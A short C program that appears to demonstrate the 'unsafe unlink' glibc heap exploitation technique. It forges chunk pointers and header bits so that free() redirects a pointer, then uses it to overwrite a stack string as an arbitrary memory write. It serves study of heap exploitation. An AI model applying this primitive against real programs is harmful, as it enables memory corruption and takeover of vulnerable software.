#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
int main() {
setbuf(stdout, NULL);
setbuf(stdin, NULL);
//start 
intptr_t *vuln_malloc_object = malloc( 25); 
intptr_t *victim_malloc_object = malloc( 121); 
vuln_malloc_object[2] = (uint64_t) &vuln_malloc_object-(sizeof(uint64_t)*3);
vuln_malloc_object[3] = (uint64_t) &vuln_malloc_object-(sizeof(uint64_t)*2);
uint64_t *victim_malloc_object_hdr = victim_malloc_object - 2;
victim_malloc_object_hdr[0] = 32;
victim_malloc_object_hdr[1] &= ~1;
free(victim_malloc_object);
//end
char victim_string[8];
strcpy(victim_string,"Hello!~");
vuln_malloc_object[3] = (uint64_t) victim_string;
vuln_malloc_object[0] = 0x4141414142424242LL;
assert(*(long *)victim_string == 0x4141414142424242L);
printf("%s","arbitrary memory write");}